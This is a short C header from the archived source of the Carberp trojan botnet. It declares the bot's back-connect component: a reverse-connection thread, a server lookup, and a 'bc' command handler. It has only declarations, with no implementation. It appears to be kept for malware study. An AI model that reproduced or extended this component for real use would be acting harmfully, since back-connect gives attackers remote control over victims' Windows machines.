/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

#ifndef BackConnectH
#define BackConnectH
//----------------------------------------------------------------------------


DWORD WINAPI BackConnectThread( LPVOID lpData );
DWORD WINAPI GetServerForBackConnect( LPVOID lpData );

const PCHAR CommandBackConnect = "bc\0";

bool ExecuteBackConnectCommand(LPVOID Manager, PCHAR Command, PCHAR Arguments);


//----------------------------------------------------------------------------
#endif